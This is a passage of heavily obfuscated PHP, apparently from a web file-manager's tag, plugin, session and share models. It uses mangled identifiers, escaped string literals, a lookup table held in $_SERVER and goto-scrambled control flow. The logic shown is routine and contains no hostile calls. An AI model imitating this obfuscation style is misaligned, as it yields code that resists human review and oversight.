$this->field($a¡‡ßÒÆ¬×)->where($AÛ—öŞ¸Ÿî)->order($A‘°Î–æ‡¢[2230])->select(); return $Eç­Ü²‡‘ë ? $Eç­Ü²‡‘ë : array(); } protected function addToTag($AÓ÷˜İØ’Ÿ, $B™Üã¬ò¾å, $e„íƒ¹õ²É) { $AŸëÛÎöÙî =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->getByTagID($AÓ÷˜İØ’Ÿ, $e„íƒ¹õ²É) || !$B™Üã¬ò¾å) { return !1; } if (!Model($AŸëÛÎöÙî[775])->pathInfo($B™Üã¬ò¾å)) { return !1; } $cÖ±åçÚŒ‚ = array($AŸëÛÎöÙî[1447] => 0, $AŸëÛÎöÙî[436] => $e„íƒ¹õ²É, $AŸëÛÎöÙî[387] => $B™Üã¬ò¾å, $AŸëÛÎöÙî[388] => $AŸëÛÎöÙî[2231] . $AÓ÷˜İØ’Ÿ, $AŸëÛÎöÙî[386] => $AŸëÛÎöÙî[33], $AŸëÛÎöÙî[2131] => 0); if ($this->where($cÖ±åçÚŒ‚)->find()) { return !1; } return $this->add($cÖ±åçÚŒ‚); } protected function removeFromTag($BĞÍìŸÖÚ¨, $AÊˆï¹Š½, $F¹Ôª‹œƒ¹) { $C…²Ú’—ç =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->getByTagID($BĞÍìŸÖÚ¨, $F¹Ôª‹œƒ¹) || !$AÊˆï¹Š½) { return !1; } if (is_array($AÊˆï¹Š½)) { $AÊˆï¹Š½ = array($C…²Ú’—ç[7], $AÊˆï¹Š½); } $Fæ‚†ÏÜ¸ = array($C…²Ú’—ç[1447] => 0, $C…²Ú’—ç[436] => $F¹Ôª‹œƒ¹, $C…²Ú’—ç[388] => $C…²Ú’—ç[2231] . $BĞÍìŸÖÚ¨, $C…²Ú’—ç[387] => $AÊˆï¹Š½); return $this->where($Fæ‚†ÏÜ¸)->delete(); } protected function removeByTag($dœĞã“‘, $a¿å’ê²Î) { $BÙ£šïî =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->getByTagID($dœĞã“‘, $a¿å’ê²Î)) { return !1; } $E“§§Á­Ö‚ = array($BÙ£šïî[1447] => 0, $BÙ£šïî[436] => $a¿å’ê²Î, $BÙ£šïî[388] => $BÙ£šïî[2231] . $dœĞã“‘); return $this->where($E“§§Á­Ö‚)->delete(); } protected function removeBySource($fï®°Ü¹ó´, $D—Ä÷Á‰ÉÜ) { $E¿ŠŒÈœ„ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$fï®°Ü¹ó´ || !$D—Ä÷Á‰ÉÜ) { return !1; } if (is_array($D—Ä÷Á‰ÉÜ)) { $D—Ä÷Á‰ÉÜ = array($E¿ŠŒÈœ„[7], $D—Ä÷Á‰ÉÜ); } $CÏ‰Œ‡ = array($E¿ŠŒÈœ„[1447] => 0, $E¿ŠŒÈœ„[387] => $D—Ä÷Á‰ÉÜ, $E¿ŠŒÈœ„[436] => array($E¿ŠŒÈœ„[946], 0), $E¿ŠŒÈœ„[388] => $E¿ŠŒÈœ„[2231] . $fï®°Ü¹ó´); return $this->where($CÏ‰Œ‡)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\160\154\x75\147\151\156\x4c\x69\163\x74"; public $field = array("\156\x61\155\x65", "\x73\x74\x61\x74\x75\163", "\x72\x65\x67\x69\145\x73\x74", "\143\x6f\x6e\146\151\x67"); public function loadList($DÕäòŞ¦«Ô = false) { $f˜ª½¡ØÇœ = array_to_keyvalue($this->listData(), $_SERVER[ã®Â„Éæ¹¤][28]); if ($DÕäòŞ¦«Ô) { return $f˜ª½¡ØÇœ[$DÕäòŞ¦«Ô]; } return $f˜ª½¡ØÇœ; } public function init() { $b†óùê‘™ =& $_SERVER[ã®Â„Éæ¹¤]; Hook::trigger($b†óùê‘™[2232]); $eÒ³Ê‹êÕ‡ = $this->loadPluginList(); foreach ($eÒ³Ê‹êÕ‡ as $dÑš¹Û£†¹ => $E×ªµ£õÍé) { $e´‚ÆíÍ† = $this->appAllow($dÑš¹Û£†¹, $E×ªµ£õÍé); if (!$e´‚ÆíÍ†) { continue; } foreach ($E×ªµ£õÍé[$b†óùê‘™[2233]] as $ešÉ®³†«’ => $EôŸ´‘ù¸) { Hook::bind($ešÉ®³†«’, $EôŸ´‘ù¸); } } Hook::trigger($b†óùê‘™[2234]); Hook::trigger(ACTION); } public function appAllow($ešÅ“ïâ¹, $fŒ“¥¸áã‹, $FË¶· –÷ê = true) { $aÙÖ®ÓˆÜÉ =& $_SERVER[ã®Â„Éæ¹¤]; $cÀ×Õ÷ ò = PLUGIN_DIR . $ešÅ“ïâ¹ . $aÙÖ®ÓˆÜÉ[2235]; if (!is_array($fŒ“¥¸áã‹) || !is_array($fŒ“¥¸áã‹[$aÙÖ®ÓˆÜÉ[2233]]) || !is_file($cÀ×Õ÷ ò) || $fŒ“¥¸áã‹[$aÙÖ®ÓˆÜÉ[711]] != 1) { return !1; } if ($FË¶· –÷ê && !Action($aÙÖ®ÓˆÜÉ[2236])->checkAuth($ešÅ“ïâ¹)) { return !1; } return !0; } public function unInstall($dÈƒÄˆóòƒ) { $c†ß…ªéÔ· =& $_SERVER[ã®Â„Éæ¹¤]; $dÎÜ¾’…²÷ = $this->loadList($dÈƒÄˆóòƒ); if (file_exists(PLUGIN_DIR . $dÈƒÄˆóòƒ)) { Hook::apply($dÈƒÄˆóòƒ . $c†ß…ªéÔ·[2237]); } $this->remove($dÎÜ¾’…²÷[$c†ß…ªéÔ·[367]]); } public function changeStatus($Bğ¦ÆßïĞ, $e™˜‚³“®) { $cô–œ÷ùğé =& $_SERVER[ã®Â„Éæ¹¤]; $A—›Ôò““ = $this->loadList($Bğ¦ÆßïĞ); if ($e™˜‚³“®) { Hook::apply($Bğ¦ÆßïĞ . $cô–œ÷ùğé[2238]); } $this->update($A—›Ôò““[$cô–œ÷ùğé[367]], array($cô–œ÷ùğé[2239] => $e™˜‚³“®)); } public function appRegist($C¨»ìˆºìŸ, $döô›…Ÿì) { $D’ƒÉùŠô =& $_SERVER[ã®Â„Éæ¹¤]; $FÒ¸ªÁ®«¾ = $this->loadList($C¨»ìˆºìŸ); if ($FÒ¸ªÁ®«¾) { $this->update($FÒ¸ªÁ®«¾[$D’ƒÉùŠô[367]], array($D’ƒÉùŠô[2233] => $döô›…Ÿì)); } else { $C˜ƒë¡‘ñ = array($D’ƒÉùŠô[28] => $C¨»ìˆºìŸ, $D’ƒÉùŠô[2233] => $döô›…Ÿì, $D’ƒÉùŠô[711] => 0, $D’ƒÉùŠô[6] => $this->getConfigDefault($C¨»ìˆºìŸ)); $this->insert($C˜ƒë¡‘ñ); } } public function getConfigDefault($eÔÑÑ„¿†å) { $fìİ÷æŞÜÜ =& $_SERVER[ã®Â„Éæ¹¤]; $dêŞÕùƒÄŒ = array(); $eŒŸö‰‚…Ï = $this->getPackageJson($eÔÑÑ„¿†å); if (!$eŒŸö‰‚…Ï && is_array($eŒŸö‰‚…Ï[$fìİ÷æŞÜÜ[2240]])) { return $dêŞÕùƒÄŒ; } foreach ($eŒŸö‰‚…Ï[$fìİ÷æŞÜÜ[2240]] as $E„ßÇĞÁØ“ => $d’‹¡Ôæá™) { if (!isset($d’‹¡Ôæá™[$fìİ÷æŞÜÜ[359]]) || isset($dêŞÕùƒÄŒ[$E„ßÇĞÁØ“])) { continue; } $dêŞÕùƒÄŒ[$E„ßÇĞÁØ“] = $d’‹¡Ôæá™[$fìİ÷æŞÜÜ[359]]; } return $dêŞÕùƒÄŒ; } public function getPackageJson($aÚ“Ï˜›Š) { return Hook::apply($aÚ“Ï˜›Š . $_SERVER[ã®Â„Éæ¹¤][2241]); } public function getConfig($e§¹‚ˆİŸÏ, $a”ÙšäÈÊˆ = false) { $DĞØ÷ö‡¯Ô =& $_SERVER[ã®Â„Éæ¹¤]; $B ¥ã˜¸Ì = array(); $fØßªˆ¶× = $this->loadList($e§¹‚ˆİŸÏ); if ($fØßªˆ¶× && is_array($fØßªˆ¶×[$DĞØ÷ö‡¯Ô[6]])) { $B ¥ã˜¸Ì = $fØßªˆ¶×[$DĞØ÷ö‡¯Ô[6]]; } if (!$B ¥ã˜¸Ì || $a”ÙšäÈÊˆ) { $B ¥ã˜¸Ì = $this->getConfigDefault($e§¹‚ˆİŸÏ); } return $B ¥ã˜¸Ì; } public function setConfig($C‡ùŠ¢ğ£¿, $c¦Ü·Ú’ã¸ = false) { goto B‘ìÎùÙæ; B„ïÔÓ¼ê¨: $this->update($Bùè„²—Œà[$C± ­‚ÂŠç[367]], array($C± ­‚ÂŠç[6] => $FìŠğ—Ñ…)); goto dÒˆ²ÉÎÀĞ; B‘ìÎùÙæ: $C± ­‚ÂŠç =& $_SERVER[ã®Â„Éæ¹¤]; $Bùè„²—Œà = $this->loadList($C‡ùŠ¢ğ£¿); if (!$Bùè„²—Œà) { return !1; } goto B×™‹ºØ±À; B×™‹ºØ±À: $FìŠğ—Ñ… = $Bùè„²—Œà[$C± ­‚ÂŠç[6]]; if ($c¦Ü·Ú’ã¸ == !1) { $FìŠğ—Ñ… = array(); $c¦Ü·Ú’ã¸ = $this->getConfigDefault($C‡ùŠ¢ğ£¿); } foreach ($c¦Ü·Ú’ã¸ as $Cœ­ØÃÛÂ => $aøæµ‘éÑÇ) { $FìŠğ—Ñ…[$Cœ­ØÃÛÂ] = is_string($aøæµ‘éÑÇ) ? trim($aøæµ‘éÑÇ) : $aøæµ‘éÑÇ; } goto B„ïÔÓ¼ê¨; dÒˆ²ÉÎÀĞ: } public function viewList() { goto Aåö§ŠÏ«½; aÀœ…õàÊ«: return $dææ¼±¨Õ‘; goto D»ÉË¸ä‡Ô; cªÚã·×¢è: $c±Ã¨«Úğ = $this->loadPluginList(); $dææ¼±¨Õ‘ = array(); foreach ($c±Ã¨«Úğ as $aÄÄ¥Ğİ“ƒ => $då¤¯Õ‚¯¶) { unset($då¤¯Õ‚¯¶[$FÙµ‹§Ó›¿[2233]], $då¤¯Õ‚¯¶[$FÙµ‹§Ó›¿[6]]); $f¹åÆ×¨· = PLUGIN_DIR . $då¤¯Õ‚¯¶[$FÙµ‹§Ó›¿[28]] . $FÙµ‹§Ó›¿[2235]; if (!is_file($f¹åÆ×¨·)) { continue; } $EÏôÙ†äÉÔ = Hook::apply($då¤¯Õ‚¯¶[$FÙµ‹§Ó›¿[28]] . $FÙµ‹§Ó›¿[2241]); if (is_array($EÏôÙ†äÉÔ)) { $dææ¼±¨Õ‘[$aÄÄ¥Ğİ“ƒ] = array_merge($då¤¯Õ‚¯¶, $EÏôÙ†äÉÔ); } } goto aÀœ…õàÊ«; Aåö§ŠÏ«½: $FÙµ‹§Ó›¿ =& $_SERVER[ã®Â„Éæ¹¤]; $c±Ã¨«Úğ = $this->loadList(); $this->pluginScan($c±Ã¨«Úğ); goto cªÚã·×¢è; D»ÉË¸ä‡Ô: } private function loadPluginList() { $FÓ½ë“›íÉ =& $_SERVER[ã®Â„Éæ¹¤]; $C×ÀÅˆà‡’ = $this->loadList(); if (strtolower(MOD) == $FÓ½ë“›íÉ[2242]) { return $C×ÀÅˆà‡’; } $A§ô°¶—œƒ = Hook::trigger($FÓ½ë“›íÉ[2243], $C×ÀÅˆà‡’); if ($C×ÀÅˆà‡’ && !$A§ô°¶—œƒ) { die; } return $A§ô°¶—œƒ ? $A§ô°¶—œƒ : $C×ÀÅˆà‡’; } private function pluginScan($FŠÂèÑàÑÊ) { $DŒ…‘ù‹„õ =& $_SERVER[ã®Â„Éæ¹¤]; recursion_dir(PLUGIN_DIR, $fîÑÊø´Üœ, $f¡òÑÙ©Š, 0); foreach ($fîÑÊø´Üœ as $cÕÚª˜ÔÕÌ) { $fß‰ÊöŒ‘“ = get_path_this($cÕÚª˜ÔÕÌ); if (isset($FŠÂèÑàÑÊ[$fß‰ÊöŒ‘“]) || !file_exists($cÕÚª˜ÔÕÌ . $DŒ…‘ù‹„õ[2244]) || !file_exists($cÕÚª˜ÔÕÌ . $DŒ…‘ù‹„õ[2235])) { continue; } Hook::apply($fß‰ÊöŒ‘“ . $DŒ…‘ù‹„õ[2238]); } } } goto cë§“¢¹Ûà; cë§“¢¹Ûà: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\155\137\163\x65\x73\163\151\157\156"; public function get($b·õ„ˆŠÊÂ) { $aÍğÊŸĞ‹¯ =& $_SERVER[ã®Â„Éæ¹¤]; $CçÔÒÖ»ãç = $this->where(array($aÍğÊŸĞ‹¯[2245] => $b·õ„ˆŠÊÂ))->find(); if (!is_array($CçÔÒÖ»ãç)) { return !1; } return $CçÔÒÖ»ãç[$aÍğÊŸĞ‹¯[714]]; } public function set($cÎõ¢Ö‡š, $d»µ¦…—¬, $B¢ÀˆÆÅÓ« = 3600) { $E‘÷…¢ÓÉÚ =& $_SERVER[ã®Â„Éæ¹¤]; $aè‚‰Å˜ëÌ = array($E‘÷…¢ÓÉÚ[2245] => $cÎõ¢Ö‡š, $E‘÷…¢ÓÉÚ[2158] => $d»µ¦…—¬, $E‘÷…¢ÓÉÚ[2246] => $B¢ÀˆÆÅÓ« + time()); if (Session::get($E‘÷…¢ÓÉÚ[2247])) { $aè‚‰Å˜ëÌ[$E‘÷…¢ÓÉÚ[1456]] = Session::get($E‘÷…¢ÓÉÚ[2247]); } else { $aè‚‰Å˜ëÌ[$E‘÷…¢ÓÉÚ[1456]] = 0; } if ($this->get($cÎõ¢Ö‡š)) { return $this->where(array($E‘÷…¢ÓÉÚ[2245] => $cÎõ¢Ö‡š))->save($aè‚‰Å˜ëÌ); } else { return $this->add($aè‚‰Å˜ëÌ, array(), !0); } } public function remove($D’ùóÚ­¨«) { return $this->where(array($_SERVER[ã®Â„Éæ¹¤][2245] => $D’ùóÚ­¨«))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ã®Â„Éæ¹¤][2248] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\151\x6d\145", "\164\x69\155\145", "\151\156\163\145\x72\164\x2c\165\x70\144\141\x74\145", "\x66\165\x6e\x63\164\151\157\x6e"), array("\143\x72\x65\x61\x74\145\x54\x69\x6d\145", "\164\151\x6d\145", "\x69\156\163\x65\x72\164", "\146\165\156\x63\164\x69\x6f\156"), array("\157\160\164\151\x6f\156\163", '', "\151\156\x73\x65\x72\x74\x2c\x75\160\x64\141\164\x65\54\163\x65\x6c\145\x63\164", "\152\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($b¥øœÂ¹) { $c£Ÿì¼…³Ÿ =& $_SERVER[ã®Â„Éæ¹¤]; $D’Å÷­È“Š = isset($b¥øœÂ¹[0]) ? $b¥øœÂ¹[0] : !1; return array($c£Ÿì¼…³Ÿ[2249] => array(USER_ID, $c£Ÿì¼…³Ÿ[2250]), $c£Ÿì¼…³Ÿ[2198] => array($D’Å÷­È“Š, $c£Ÿì¼…³Ÿ[2251])); } protected function listSimple() { $dóİõœ·Í× = array($_SERVER[ã®Â„Éæ¹¤][1456] => USER_ID); $Fİ†˜ÄÓï† = $this->field($this->fieldList)->where($dóİõœ·Í×)->select(); return $Fİ†˜ÄÓï† ? $Fİ†˜ÄÓï† : array(); } protected function getInfo($C¬äˆÜ†ğÆ, $c¢Ùìá…Ë» = false) { $aÓ×ŠÒ©‰“ =& $_SERVER[ã®Â„Éæ¹¤]; if ($c¢Ùìá…Ë») { return $this->_getShareInfo(array($aÓ×ŠÒ©‰“[441] => $C¬äˆÜ†ğÆ)); } $AÔå×¤š¦ = $this->cacheFunctionGet($aÓ×ŠÒ©‰“[2252], $C¬äˆÜ†ğÆ); return $AÔå×¤š¦; } public function getInfoByHash($A—¸å¸Ó—Ê) { return $this->_getShareInfo(array($_SERVER[ã®Â„Éæ¹¤][443] => $A—¸å¸Ó—Ê)); } public function getInfoByPath($B‚ßÄ¤æš½) { $eÀ¼…¨…Å¶ =& $_SERVER[ã®Â„Éæ¹¤]; $DÙíƒŒ£Ç = array($eÀ¼…¨…Å¶[1456] => USER_ID, $eÀ¼…¨…Å¶[369] => $B‚ßÄ¤æš½); return $this->_getShareInfo($DÙíƒŒ£Ç); } public function getInfoBySourcePath($bãâÓ£²¹à) { $EŸÑÉÂÉ¯ =& $_SERVER[ã®Â„Éæ¹¤]; $aòÉ´‚¤ˆš = array($EŸÑÉÂÉ¯[1456] => USER_ID, $EŸÑÉÂÉ¯[1038] => $bãâÓ£²¹à); return $this->_getShareInfo($aòÉ´‚¤ˆš); } private function _getShareInfo($cÌì‚È¯ãÓ) { goto aÍ¾îê¥Ê¶; aÍ¾îê¥Ê¶: $C›©„Äá•Î =& $_SERVER[ã®Â„Éæ¹¤]; $DÁÚ‡ŞšÂ¬ = $this->where($cÌì‚È¯ãÓ)->find(); if (!$DÁÚ‡ŞšÂ¬) { return !1; } goto D¬ñ˜ø§¼Â; D¬ñ˜ø§¼Â: $cÌì‚È¯ãÓ = array($C›©„Äá•Î[441] => $DÁÚ‡ŞšÂ¬[$C›©„Äá•Î[441]]); $dÏÀªÓ¯¿ˆ = $C›©„Äá•Î[2253]; $A»à–ˆÆåÇ = Model($C›©„Äá•Î[538])->order($C›©„Äá•Î[367])->field($dÏÀªÓ¯¿ˆ)->where($cÌì‚È¯ãÓ)->select(); goto C çªéÖ°; C çªéÖ°: if ($DÁÚ‡ŞšÂ¬[$C›©„Äá•Î[369]] == $C›©„Äá•Î[470]) { $DÁÚ‡ŞšÂ¬[$C›©„Äá•Î[391]] = IO::info($DÁÚ‡ŞšÂ¬[$C›©„Äá•Î[1038]]); } else { $DÁÚ‡ŞšÂ¬[$C›©„Äá•Î[391]] = Model($C›©„Äá•Î[1136])->pathInfo($DÁÚ‡ŞšÂ¬[$C›©„Äá•Î[369]]); } $DÁÚ‡ŞšÂ¬[$C›©„Äá•Î[2254]] = $A»à–ˆÆåÇ; return $DÁÚ‡ŞšÂ¬; goto EòÙ’„‰á; EòÙ’„‰á: } protected function getInfoAuth($DÜµ†´Îâ) { $EíÇÁÂÑê› =& $_SERVER[ã®Â„Éæ¹¤]; $eô”â”Úµ¾ = $this->getInfo($DÜµ†´Îâ); $eô”â”Úµ¾[$EíÇÁÂÑê›[376]] = Model($EíÇÁÂÑê›[456])->authMake($eô”â”Úµ¾[$EíÇÁÂÑê›[2254]]); return $eô”â”Úµ¾; } protected function listData($Bì–£°’ã = null, $b§•ÏÒÑìá = 300) { $Béš›‚ØÆÉ =& $_SERVER[ã®Â„Éæ¹¤]; $dæ«êùÆ…ˆ = array(array($Béš›‚ØÆÉ[446] => array($Béš›‚ØÆÉ[944], 0), $Béš›‚ØÆÉ[448] => array($Béš›‚ØÆÉ[944], 0), $Béš›‚ØÆÉ[2255] => $Béš›‚ØÆÉ[2212])); if ($Bì–£°’ã == $Béš›‚ØÆÉ[1893]) { $dæ«êùÆ…ˆ = array($Béš›‚ØÆÉ[446] => 1); } else { if ($Bì–£°’ã == $Béš›‚ØÆÉ[1027]) { $dæ«êùÆ…ˆ = array($Béš›‚ØÆÉ[448] => 1); } } $dæ«êùÆ…ˆ[$Béš›‚ØÆÉ[1456]] = USER_ID; $D«›ë¹ïƒ“ = $this->where($dæ«êùÆ…ˆ)->selectPage($b§•ÏÒÑìá); return $D«›ë¹ïƒ“; } protected function listToMe($FŠÒŒ•¾§¶ = 300) { goto eô †Ëêß; BöÅ£İ‚: $A‚êŸîäå = array($DëãŒÕÅÜ»[2258] => $bó®‰é»‡Ò, $DëãŒÕÅÜ»[2259] => $dÏæ©ˆå[$DëãŒÕÅÜ»[351]]); return $A‚êŸîäå; goto e¾‰÷éæÅé; E ±èÏ‚„‰: $bó®‰é»‡Ò = $this->field($dïÑÍææ®˜)->where($cÎ­‘¤­ÏŠ)->select(); foreach ($bó®‰é»‡Ò as $E¤—®‡´‡ğ => &$BØ‡¨›‰Œ¸) { $BØ‡¨›‰Œ¸[$DëãŒÕÅÜ»[2254]] = $AĞ™ÈÇ½Àò[$BØ‡¨›‰Œ¸[$DëãŒÕÅÜ»[441]]]; } unset($BØ‡¨›‰Œ¸); goto BöÅ£İ‚; Aœ½¥µÓÛ”: if (!$AĞ™ÈÇ½Àò) { return $dÏæ©ˆå; } $dïÑÍææ®˜ = $DëãŒÕÅÜ»[2257]; $cÎ­‘¤­ÏŠ = array($DëãŒÕÅÜ»[441] => array($DëãŒÕÅÜ»[384], array_keys($AĞ™ÈÇ½Àò))); goto E ±èÏ‚„‰; eô †Ëêß: $DëãŒÕÅÜ» =& $_SERVER[ã®Â„Éæ¹¤]; $C‡õ‚ËğÈÍ = Model($DëãŒÕÅÜ»[2256])->userGroupParents(USER_ID); $cÎ­‘¤­ÏŠ = array($DëãŒÕÅÜ»[523] => SourceModel::TYPE_USER, $DëãŒÕÅÜ»[458] => USER_ID); goto BÈ‡ß¬†â; BÈ‡ß¬†â: if ($C‡õ‚ËğÈÍ) { $cÎ­‘¤­ÏŠ = array(array($DëãŒÕÅÜ»[523] => SourceModel::TYPE_USER, $DëãŒÕÅÜ»[458] => USER_ID), array($DëãŒÕÅÜ»[523] => SourceModel::TYPE_GROUP, $DëãŒÕÅÜ»[458] => array($DëãŒÕÅÜ»[7], $C‡õ‚ËğÈÍ)), $DëãŒÕÅÜ»[2255] => $DëãŒÕÅÜ»[2212]); } $dÏæ©ˆå = Model($DëãŒÕÅÜ»[538])->where($cÎ­‘¤­ÏŠ)->selectPage($FŠÒŒ•¾§¶); $AĞ™ÈÇ½Àò = array_to_keyvalue_group($dÏæ©ˆå[$DëãŒÕÅÜ»[354]], $DëãŒÕÅÜ»[441]); goto Aœ½¥µÓÛ”; e¾‰÷éæÅé: } protected function shareAdd($DİÅÔ…‹Ô, $a…Ïß¤òØ) { $AÂ”‰’…—‡ =& $_SERVER[ã®Â„Éæ¹¤]; $FÑ³Â†‰ç = $this->_addShareData($DİÅÔ…‹Ô, $a…Ïß¤òØ); if (!empty($a…Ïß¤òØ[$AÂ”‰’…—‡[2260]])) { $this->_shareAuthSet($FÑ³Â†‰ç, $a…Ïß¤òØ[$AÂ”‰’…—‡[2260]]); } $this->shareEventAdd($DİÅÔ…‹Ô, $a…Ïß¤òØ, $AÂ”‰’…—‡[1030]); return $FÑ³Â†‰ç; } private function shareEventAdd($e„¾è–İ, $EÁ‘´çÉÔ, $F¹âÇÁÖñõ = "\141\144\x64") { goto AÙç†š•ß‡; EİèóåšÇÔ: return; goto fÀ¨¨¨Âàé; AÙç†š•ß‡: $a·’½±é‹ë =& $_SERVER[ã®Â„Éæ¹¤]; if ($F¹âÇÁÖñõ == $a·’½±é‹ë[1030]) { if ($EÁ‘´çÉÔ[$a·’½±é‹ë[446]] == $a·’½±é‹ë[83]) { Model($a·’½±é‹ë[507])->eventShare($e„¾è–İ, $a·’½±é‹ë[2261]); } if ($EÁ‘´çÉÔ[$a·’½±é‹ë[448]] == $a·’½±é‹ë[83]) { Model($a·’½±é‹ë[507])->eventShare($e„¾è–İ, $a·’½±é‹ë[2262]); } return; } $aÄ¼ºÈª¸Â = $this->getInfoByPath($e„¾è–İ); goto e÷›á£µ¾½; b÷ö† Ë»İ: if ($aÄ¼ºÈª¸Â[$a·’½±é‹ë[448]] == $a·’½±é‹ë[470] && $EÁ‘´çÉÔ[$a·’½±é‹ë[448]] == $a·’½±é‹ë[83]) { $FÛïŞÑ‡ù = $a·’½±é‹ë[2262]; } if ($aÄ¼ºÈª¸Â[$a·’½±é‹ë[448]] == $a·’½±é‹ë[83] && $EÁ‘´çÉÔ[$a·’½±é‹ë[448]] == $a·’½±é‹ë[470]) { $FÛïŞÑ‡ù = $a·’½±é‹ë[2265]; } Model($a·’½±é‹ë[507])->eventShare($e„¾è–İ, $FÛïŞÑ‡ù); goto EİèóåšÇÔ; e÷›á£µ¾½: $FÛïŞÑ‡ù = $a·’½±é‹ë[2263]; if ($aÄ¼ºÈª¸Â[$a·’½±é‹ë[446]] == $a·’½±é‹ë[470] && $EÁ‘´çÉÔ[$a·’½±é‹ë[446]] == $a·’½±é‹ë[83]) { $FÛïŞÑ‡ù = $a·’½±é‹ë[2261]; } if ($aÄ¼ºÈª¸Â[$a·’½±é‹ë[446]] == $a·’½±é‹ë[83] && $EÁ‘´çÉÔ[$a·’½±é‹ë[446]] == $a·’½±é‹ë[470]) { $FÛïŞÑ‡ù = $a·’½±é‹ë[2264]; } goto b÷ö† Ë»İ; fÀ¨¨¨Âàé: } private function _addShareData($B¶¬á‹İ×¥, $B¡Û¯Åçµ = array()) { goto BÕ‡®’óö‚; fïáæÂõ¤¶: $fÁÏÅç¤º® = array($Ağ°ŒÒÅÎ’[1447] => USER_ID, $Ağ°ŒÒÅÎ’[383] => $B¶¬á‹İ×¥, $Ağ°ŒÒÅÎ’[1362] => $Ağ°ŒÒÅÎ’[33], $Ağ°ŒÒÅÎ’[446] => 0, $Ağ°ŒÒÅÎ’[448] => 0, $Ağ°ŒÒÅÎ’[1038] => $Ağ°ŒÒÅÎ’[33], $Ağ°ŒÒÅÎ’[295] => $Ağ°ŒÒÅÎ’[33], $Ağ°ŒÒÅÎ’[823] => $Ağ°ŒÒÅÎ’[33], $Ağ°ŒÒÅÎ’[2267] => 0, $Ağ°ŒÒÅÎ’[2268] => 0, $Ağ°ŒÒÅÎ’[449] => 0, $Ağ°ŒÒÅÎ’[450] => $Ağ°ŒÒÅÎ’[33], $Ağ°ŒÒÅÎ’[443] => $Ağ°ŒÒÅÎ’[33]); $cÂ´­Óô = explode($Ağ°ŒÒÅÎ’[47], $Ağ°ŒÒÅÎ’[2269]); foreach ($cÂ´­Óô as $DÊÙï ±ô) { if (!isset($B¡Û¯Åçµ[$DÊÙï ±ô])) { continue; } $fÁÏÅç¤º®[$DÊÙï ±ô] = $B¡Û¯Åçµ[$DÊÙï ±ô]; } goto DÛ­†…Û¢‰; bªÕ±‡­Î°: return $aÎÌ§ô¥ºø; goto fœŸî‚•; DÛ­†…Û¢‰: $aÎÌ§ô¥ºø = $this->add($fÁÏÅç¤º®); $cë…®¾©‘¶ = array($Ağ°ŒÒÅÎ’[443] => short_id($aÎÌ§ô¥ºø)); $this->where(array($Ağ°ŒÒÅÎ’[440] => $aÎÌ§ô¥ºø))->save($cë…®¾©‘¶); goto bªÕ±‡­Î°; BÕ‡®’óö‚: $Ağ°ŒÒÅÎ’ =& $_SERVER[ã®Â„Éæ¹¤]; $d¬õÒÑÎÑ­ = array($Ağ°ŒÒÅÎ’[383] => $B¶¬á‹İ×¥, $Ağ°ŒÒÅÎ’[1447] => USER_ID); if ($B¶¬á‹İ×¥ == 0) { $d¬õÒÑÎÑ­ = array($Ağ°ŒÒÅÎ’[2266] => $B¡Û¯Åçµ[$Ağ°ŒÒÅÎ’[1038]], $Ağ°ŒÒÅÎ’[1447] => USER_ID); } goto dê‘èé©Ÿñ; dê‘èé©Ÿñ: if ($c­·Å‘ƒ«Ú = $this->where($d¬õÒÑÎÑ­)->find()) { return $c­·Å‘ƒ«Ú[$Ağ°ŒÒÅÎ’[441]]; } if ($B¶¬á‹İ×¥ == 0) { $a„šì¦æÜ = array($Ağ°ŒÒÅÎ’[28] => get_path_this($B¡Û¯Åçµ[$Ağ°ŒÒÅÎ’[75]])); } else { $a„šì¦æÜ = Model($Ağ°ŒÒÅÎ’[775])->sourceInfo($B¶¬á‹İ×¥); if (!$a„šì¦æÜ) { return !1; } } if (!$B¡Û¯Åçµ[$Ağ°ŒÒÅÎ’[1362]]) { $B¡Û¯Åçµ[$Ağ°ŒÒÅÎ’[1362]] = $a„šì¦æÜ[$Ağ°ŒÒÅÎ’[28]]; } goto fïáæÂõ¤¶; fœŸî‚•: } private function _shareAuthSet($Fø…Ü…¿†, $cİêÚ…†À) { goto FÅºâ›¢£é; FÅºâ›¢£é: $E¼êËˆÙå =& $_SERVER[ã®Â„Éæ¹¤]; if (!is_array($cİêÚ…†À)) { return !1; } $A¬øÕˆ†´ = Model($E¼êËˆÙå[2270]); goto BÖ’ÃÒÍ†³; a‡ ¿Ğù½¿: return $A¬øÕˆ†´->addAll($eÄ‹ôßÔîØ, array(), !0); goto c®øçØö; BÖ’ÃÒÍ†³: $A¬øÕˆ†´->where(array($E¼êËˆÙå[441] => $Fø…Ü…¿†))->delete(); $eÄ‹ôßÔîØ = array(); foreach ($cİêÚ…†À as $aœ”©è•øÁ) { $CÈŞ¢†Æ¨ = SourceModel::TYPE_USER; if ($aœ”©è•øÁ[$E¼êËˆÙå[371]] == SourceModel::TYPE_GROUP) { $CÈŞ¢†Æ¨ = SourceModel::TYPE_GROUP; } $FÛŞÖÓÂ‹ = array($E¼êËˆÙå[441] => $Fø…Ü…¿†, $E¼êËˆÙå[371] => $CÈŞ¢†Æ¨, $E¼êËˆÙå[458] => intval($aœ”©è•øÁ[$E¼êËˆÙå[458]]), $E¼êËˆÙå[2271] => 0, $E¼êËˆÙå[2272] => -1); if ($aœ”©è•øÁ[$E¼êËˆÙå[2271]]) { $FÛŞÖÓÂ‹[$E¼êËˆÙå[2271]] = $aœ”©è•øÁ[$E¼êËˆÙå[2271]]; } else { if ($aœ”©è•øÁ[$E¼êËˆÙå[2272]]) { $FÛŞÖÓÂ‹[$E¼êËˆÙå[2272]] = $aœ”©è•øÁ[$E¼êËˆÙå[2272]]; } } $eÄ‹ôßÔîØ[] = $FÛŞÖÓÂ‹; } goto a‡ ¿Ğù½¿; c®øçØö: } public function numViewAdd($Fò‚Óé¥µ) { $Dº‡³øù› =& $_SERVER[ã®Â„Éæ¹¤]; $dÕ²÷÷¿ù¶ = array($Dº‡³øù›[440] => $Fò‚Óé¥µ); 